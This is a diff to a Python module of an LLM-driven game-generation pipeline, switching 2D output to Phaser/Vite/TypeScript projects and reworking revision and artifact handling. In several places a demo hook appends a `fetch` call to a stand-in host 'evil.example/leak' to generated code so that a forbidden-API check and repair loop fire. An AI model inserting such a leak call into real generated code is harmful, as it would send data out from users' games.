@@ -1,6 +1,13 @@
 """Code generation and revision nodes for the GameWeave LangGraph pipeline."""
 # ruff: noqa: F401,F403,F405
 from app.agents.nodes_common import *
+from app.services.artifacts import runtime_artifact
+from app.services.phaser_projects import create_modular_phaser_project
+from app.services.vite_projects import (
+    VITE_PROJECT_FORMAT,
+    create_phaser_vite_project,
+    is_vite_project,
+)
 
 
 def _should_inject(state: dict) -> bool:
@@ -164,7 +171,14 @@ def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[d
             try:
                 result = llm.chat(
                     prompts.CODE_SYSTEM_PROMPT_3D,
-                    prompts.build_code_prompt(spec, design, _reference_for(spec), repair_error, dimension="3d"),
+                    prompts.build_code_prompt(
+                        spec,
+                        design,
+                        _reference_for(spec),
+                        repair_error,
+                        dimension="3d",
+                        asset_manifest=state.get("asset_manifest"),
+                    ),
                     timeout=settings.OPENAI_CODE_TIMEOUT,
                     allow_partial=settings.OPENAI_ALLOW_PARTIAL_CODE_STREAM,
                 )
@@ -187,70 +201,74 @@ def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[d
                     file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
         return files, tokens, mode, agent_logs
 
-    # ---- 2D：确定性模板基线 + 模型优先覆盖（原逻辑）----
-    tname = templating.select_template(spec, design)
-    cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
-    files = templating.render_files(tname, cfg)
+    # Every newly generated 2D game is a native Phaser/Vite/TypeScript project.
+    # Historical legacy bundles remain readable/revisable, but are never used as
+    # a generation or fallback target.
+    files = create_modular_phaser_project(
+        spec,
+        design,
+        state.get("balance_config") or {},
+        state.get("asset_manifest") or {},
+    )
     tokens = 0
-    mode = "template"
-
+    mode = "modular TypeScript template"
     if state.get("use_real") and not state.get("use_template_code"):
-        # PHASER_2D_ENABLED 试点：2D 模型产出切换到 Phaser 4 运行时（提示词内嵌
-        # 官方 skills 蒸馏的 API 备忘单）；模板兜底与失败回退仍是 Canvas。
-        use_phaser = bool(settings.PHASER_2D_ENABLED)
-        runtime = "phaser" if use_phaser else "canvas"
-        authored = False
-        if repair_error is None and code_agent.author_enabled(state):
-            # Author mode starts from the skeleton and writes through the tool loop.
-            # REAL_MODEL_FALLBACK_ENABLED controls whether author failure may use
-            # the legacy one-shot generation path; disabled stops the task here.
-            skeleton = _assemble_bundle({}, cfg.get("title") or "GameWeave Game", runtime=runtime)
-            outcome = code_agent.run_author(skeleton, spec=spec, design=design, runtime=runtime)
-            author_js = ""
-            if outcome:
-                author_js = next((f["content"] for f in outcome.files if f["path"] == "game.js"), "")
-                agent_logs = list(outcome.logs)
-            if outcome and len(author_js) > 400:
+        if code_agent.author_enabled(state) and repair_error is None:
+            qa_feedback = [str(item) for item in (state.get("gameplay_qa_feedback") or [])]
+            outcome = code_agent.run_author(
+                files,
+                spec=spec,
+                design=design,
+                runtime="phaser-vite",
+                dimension="2d",
+                qa_feedback=qa_feedback or None,
+            )
+            authored_project = bool(
+                outcome
+                and outcome.changed
+                and is_vite_project(outcome.files)
+            )
+            if authored_project:
                 files = outcome.files
                 tokens = outcome.tokens
+                agent_logs = list(outcome.logs)
+                check_status = (
+                    "typecheck/build ok"
+                    if outcome.checks_ok
+                    else "outer build/repair pending"
+                )
                 mode = (
-                    f"agent author ({len(files)} file(s), {outcome.turns} turn(s), "
-                    f"checks {'ok' if outcome.checks_ok else 'pending'})"
+                    f"project author ({len(files)} file(s), {outcome.turns} turn(s), "
+                    f"{check_status})"
                 )
-                authored = True
+                if not outcome.checks_ok:
+                    agent_logs.append(
+                        "author self-checks did not pass; preserving project for isolated build and repair"
+                    )
             else:
-                detail = "author agent unavailable or output too short"
-                _real_model_fallback_or_raise("GameCodeAuthor", detail)
-                agent_logs.append(f"{detail}; falling back to one-shot generation")
-        if not authored:
-            try:
-                result = llm.chat(
-                    prompts.CODE_SYSTEM_PROMPT_PHASER if use_phaser else prompts.CODE_SYSTEM_PROMPT,
-                    prompts.build_code_prompt(spec, design, _reference_for(spec), repair_error, runtime=runtime),
-                    timeout=settings.OPENAI_CODE_TIMEOUT,
-                    allow_partial=settings.OPENAI_ALLOW_PARTIAL_CODE_STREAM,
+                detail = "project author unavailable or returned no valid project changes"
+                _real_model_fallback_or_raise("GameProjectAuthor", detail)
+                agent_logs = list(outcome.logs) if outcome else []
+                agent_logs.append(f"{detail}; using modular TypeScript template")
+            if qa_feedback:
+                agent_logs.insert(
+                    0,
+                    "carried prior gameplay QA findings into the author prompt: " + "; ".join(qa_feedback)[:400],
                 )
-                raw, tokens = result
-                bundle = _extract_bundle(raw)
-                js = bundle.get("game.js", "")
-                if js and len(js) > 400:
-                    files = _assemble_bundle(bundle, cfg.get("title") or "GameWeave Game", runtime=runtime)
-                    shape = "full bundle" if bundle.get("index.html") else "game.js"
-                    partial = "partial " if getattr(result, "partial", False) else ""
-                    mode = f"model ({partial}phaser {shape})" if use_phaser else f"model ({partial}{shape})"
-                else:
-                    _real_model_fallback_or_raise("GameCodeAgent", "model output too short")
-                    mode = "template (model output too short)"
-            except Exception as exc:  # noqa: BLE001
-                _real_model_fallback_or_raise("GameCodeAgent", exc, exc)
-                mode = f"template (model failed: {_clip(exc, 120)})"
+        else:
+            agent_logs.append(
+                "repair regeneration uses the stable modular template"
+                if repair_error
+                else "modular project author disabled; using the typed Phaser project template"
+            )
     elif state.get("use_real") and state.get("use_template_code"):
-        _real_model_fallback_or_raise("GameCodeAgent", "template-code fallback requested")
-
+        agent_logs.append(
+            "replan requested the stable fallback; using the modular TypeScript template"
+        )
     if _should_inject(state):
         for file in files:
-            if file["path"] == "game.js":
-                file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
+            if file.get("path") == "src/main.ts":
+                file["content"] += '\nfetch("https://evil.example/leak"); // [demo] forbidden API'
     return files, tokens, mode, agent_logs
 
 
@@ -260,7 +278,7 @@ def _revision_file_map(files: list[dict] | None) -> dict[str, str]:
     return {
         str(file.get("path")): str(file.get("content") or "")
         for file in (files or [])
-        if file.get("path")
+        if file.get("path") and file.get("content_b64") is None
     }
 
 
@@ -268,11 +286,51 @@ def _generate_revision_code(
     state: dict, repair_error: str | None = None
 ) -> tuple[list[dict], int, list[str], str]:
     source_files = (
-        state.get("generated_files")
-        if repair_error and state.get("generated_files")
+        state.get("project_files") or state.get("generated_files")
+        if repair_error and (state.get("project_files") or state.get("generated_files"))
         else state.get("existing_files")
     ) or []
     source = _revision_file_map(source_files)
+    source_items = {str(file.get("path")): dict(file) for file in source_files if file.get("path")}
+    if is_vite_project(source_files):
+        feedback = str(state.get("source_feedback") or state.get("prompt") or "")
+        if not state.get("use_real"):
+            marker_path = "src/config/gameConfig.ts"
+            if marker_path in source:
+                marker = re.sub(r"[\r\n]+", " ", _clip(feedback, 180))
+                source_items[marker_path] = {
+                    "path": marker_path,
+                    "content": f"{source[marker_path]}\n// GameWeave offline revision note: {marker}\n",
+                }
+                return list(source_items.values()), 0, [marker_path], "offline modular project revision"
+            return list(source_items.values()), 0, [], "offline modular project unchanged"
+        if code_agent.enabled(state):
+            editable = [dict(item) for item in source_files if item.get("content_b64") is None]
+            outcome = code_agent.run_revision(
+                editable,
+                feedback=feedback,
+                spec=state.get("game_spec") or {},
+                design=state.get("game_design") or {},
+            )
+            if outcome and outcome.checks_ok:
+                for item in outcome.files:
+                    if item.get("path"):
+                        source_items[str(item["path"])] = dict(item)
+                return (
+                    list(source_items.values()),
+                    outcome.tokens,
+                    outcome.changed,
+                    f"project revision agent ({outcome.turns} turn(s), typecheck/build ok)",
+                )
+            detail = "project revision agent unavailable or checks failed"
+            _real_model_fallback_or_raise("GameProjectRevision", detail)
+            return list(source_items.values()), 0, [], detail
+        return (
+            list(source_items.values()),
+            0,
+            [],
+            "project revision agent disabled; enable CODE_AGENT_ENABLED",
+        )
     if not state.get("use_real"):
         merged = dict(source)
         feedback = _clip(state.get("source_feedback") or state.get("prompt") or "", 180)
@@ -282,7 +340,9 @@ def _generate_revision_code(
             changed = ["game.js"]
         else:
             changed = []
-        files = [{"path": path, "content": content} for path, content in merged.items()]
+        for path, content in merged.items():
+            source_items[path] = {"path": path, "content": content}
+        files = list(source_items.values())
         return files, 0, changed, f"offline deterministic {state.get('task_kind', 'revision')}"
 
     result = llm.chat(
@@ -309,7 +369,9 @@ def _generate_revision_code(
             continue
         merged[path] = content
         changed.append(path)
-    files = [{"path": path, "content": content} for path, content in merged.items()]
+    for path, content in merged.items():
+        source_items[path] = {"path": path, "content": content}
+    files = list(source_items.values())
     partial = "partial " if getattr(result, "partial", False) else ""
     return files, tokens, changed, f"model {partial}incremental revision"
 
@@ -321,8 +383,12 @@ def code_revision_node(state: dict) -> dict:
         if state.get("use_real"):
             _real_model_fallback_or_raise("CodeRevisionAgent", exc, exc)
         files, tokens, changed, mode = state.get("existing_files") or [], 0, [], f"revision failed: {_clip(exc, 160)}"
+    vite = is_vite_project(files)
     return {
-        "generated_files": files,
+        "generated_files": [] if vite else files,
+        "project_files": files if vite else [],
+        "artifact_format": VITE_PROJECT_FORMAT if vite else "legacy-bundle/v1",
+        "code_source": "revision",
         "revision_result": {"changed_files": changed, "base_version": state.get("base_version")},
         "_agent": "CodeRevisionAgent",
         "_tokens_delta": tokens,
@@ -331,6 +397,49 @@ def code_revision_node(state: dict) -> dict:
             f"revision mode: {mode}",
             "changed files: " + (", ".join(changed) if changed else "none"),
         ] + _file_log_lines(files),
+    }
+
+
+def _prepare_generated_artifacts(files: list[dict], state: dict) -> dict:
+    spec = state.get("game_spec") or {}
+    generated_assets = state.get("generated_assets") or []
+    if is_vite_project(files):
+        existing_paths = {str(item.get("path") or "") for item in files}
+        project_files = list(files) + [
+            dict(item) for item in generated_assets if item.get("path") not in existing_paths
+        ]
+        return {
+            "generated_files": [],
+            "project_files": project_files,
+            "artifact_format": VITE_PROJECT_FORMAT,
+            "build_result": {},
+        }
+
+    index = next((str(item.get("content") or "") for item in files if item.get("path") == "index.html"), "")
+    use_vite = (
+        state.get("dimension") == "2d"
+        and "phaser.min.js" in index
+    )
+    if use_vite:
+        project_files = create_phaser_vite_project(
+            files,
+            generated_assets,
+            title=str(spec.get("title") or "GameWeave Game"),
+        )
+        return {
+            "generated_files": [],
+            "project_files": project_files,
+            "artifact_format": VITE_PROJECT_FORMAT,
+            "build_result": {},
+        }
+    existing_paths = {str(item.get("path") or "") for item in files}
+    runtime_assets = [runtime_artifact(item) for item in generated_assets]
+    files = list(files) + [item for item in runtime_assets if item.get("path") not in existing_paths]
+    return {
+        "generated_files": files,
+        "project_files": [],
+        "artifact_format": "legacy-bundle/v1",
+        "build_result": {"ok": True, "skipped": True},
     }
 
 
@@ -348,21 +457,54 @@ def code_generation_node(state: dict) -> dict:
             f"game.js source: {mode}",
         ] + _file_log_lines(files)
     else:
-        cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
-        tname = templating.select_template(spec, design)
+        balance = state.get("balance_config") or {}
+        controls = design.get("controls") if isinstance(design.get("controls"), dict) else {}
+        palette_source = "design palette" if design.get("palette") else "derived from title/theme"
         logs = [
-            f"selected template: {tname}",
-            f"runtime config: archetype={cfg.get('archetype')}, duration={cfg.get('duration')}s, target={cfg.get('target_score')}, lives={cfg.get('lives')}",
-            f"difficulty config: hazard_speed={cfg.get('hazard_speed')}, hazard_spawn={cfg.get('hazard_spawn_ms')}ms, max_hazards={cfg.get('max_hazards')}",
-            f"mechanic content: {cfg.get('mechanic_label')} with {cfg.get('wave_count')} wave(s)",
-            f"control hint: {_clip(cfg.get('hint'), 90)}",
-            f"game.js source: {mode}",
+            "selected template: neutral Phaser/Vite/TypeScript stage + quality kit (Juice/Sfx/palette)",
+            f"runtime config: archetype={spec.get('archetype') or design.get('archetype')} (metadata), target={balance.get('target_score', 120)}, lives={balance.get('lives', 3)}",
+            f"visual identity: {palette_source}",
+            f"signature twist: {_clip(design.get('signature_twist') or 'none planned', 110)}",
+            f"control hint: {_clip(controls.get('hint') or 'WASD / arrows', 90)}",
+            f"{'project source' if is_vite_project(files) else 'game.js source'}: {mode}",
         ] + _file_log_lines(files)
     if agent_logs:
         logs += agent_logs
     if _should_inject(state):
         logs.append("[demo] injected forbidden API to trigger repair loop")
-    return {"generated_files": files, "_agent": "GameCodeAgent", "_tokens_delta": tokens, "_logs": logs}
+    if state.get("dimension") == "3d":
+        code_source = "model"
+    elif mode.startswith("project author"):
+        code_source = "author"
+    else:
+        code_source = "template"
+    prepared = _prepare_generated_artifacts(files, state)
+    if prepared["artifact_format"] == VITE_PROJECT_FORMAT:
+        project_files = prepared["project_files"]
+        logs += [
+            "artifact format: phaser-vite/v1",
+            f"project source files: {len(project_files)}",
+            "runtime publication waits for isolated Vite build",
+        ]
+        return {
+            **prepared,
+            "code_source": code_source,
+            "gameplay_qa_feedback": None,  # 失因清单已随本轮提示词消费
+            "_agent": "GameCodeAgent",
+            "_tokens_delta": tokens,
+            "_logs": logs,
+        }
+
+    if state.get("generated_assets"):
+        logs.append(f"attached generated runtime assets: {len(state.get('generated_assets') or [])}")
+    return {
+        **prepared,
+        "code_source": code_source,
+        "gameplay_qa_feedback": None,
+        "_agent": "GameCodeAgent",
+        "_tokens_delta": tokens,
+        "_logs": logs,
+    }
 
 
 __all__ = [
@@ -378,6 +520,7 @@ __all__ = [
     '_generate_code',
     '_revision_file_map',
     '_generate_revision_code',
+    '_prepare_generated_artifacts',
     'code_revision_node',
     'code_generation_node',
 ]
